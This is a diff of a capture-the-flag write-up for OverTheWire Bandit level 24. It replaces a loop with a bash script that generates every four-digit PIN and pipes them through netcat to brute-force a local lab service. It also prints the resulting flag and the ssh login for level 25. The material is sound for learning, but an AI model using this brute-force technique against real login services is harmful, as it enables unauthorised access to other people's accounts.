@@ -365,27 +365,50 @@ I got the following:
 ```
 I inserted: `UoMYTrfrBFHyQXmg6gzctqAwOmw1Ioh 0123` and got: `Fail! You did not supply enough data. Try again`
 
-Then i created a simple bash script to automate brute force password guessing:
+First create some folders and files which we will use in the script:
 ```sh
       mkdir -p    /tmp/bandit24lu
-      touch       /tmp/bandit24lu/solver.sh
-      chmod 777   /tmp/bandit24lu/solver.sh
-      vim         /tmp/bandit24lu/solver.sh
+      touch       /tmp/bandit24lu/bandit24.sh
+      touch       /tmp/bandit24lu/bandit24_pass
+      touch       /tmp/bandit24lu/bandit24_result
+      chmod 777   /tmp/bandit24lu/bandit24.sh
+      chmod 777   /tmp/bandit24lu/bandit24_pass
+      chmod 777   /tmp/bandit24lu/bandit24_result
+      vim         /tmp/bandit24lu/bandit24.sh
+```
 
+Then i created a simple bash script to automate brute force password guessing:
+```bash
 #!/bin/bash
-PASS=UoMYTrfrBFHyQXmg6gzctqAwOmw1Ioh
-N=10000
-PIN=0
-while [ $PIN -lt $N ]
-do
-      response="$(echo $PASS $PIN | nc localhost 30002)"
-      echo -ne $response
-      ((PIN++))
-done 
-```
-```
-      /tmp/bandit24lu/solver.sh
-```
 
+PASS_FILE_PATH=/tmp/bandit24lu/bandit24_pass
+RESULT_FILE_PATH=/tmp/bandit24lu/bandit24_result
+PASS=UoMYTrfrBFHyQXmg6gzctqAwOmw1Ioh
+
+for PIN in {0000..9999}
+do
+              echo $PASS $PIN >> $PASS_FILE_PATH
+                        done
+
+cat $PASS_FILE_PATH | nc localhost 30002 > $RESULT_FILE_PATH 2>&1
+
+sort -u $RESULT_FILE_PATH
+```
+First i generated a list of pincodes which are later inserted into netcat. 
+The result is written into the `bandit24_result` file. 
+After running the script:
+```
+      /tmp/bandit24lu/bandit24.sh
+```
+I got the flag:
+``` FLAG: uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG```
+
+
+### [Level 25](http://overthewire.org/wargames/bandit/bandit25.html)
+                    
+```sh 
+      ssh bandit25@bandit.labs.overthewire.org -p 2220
+      uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+``` 
 
 
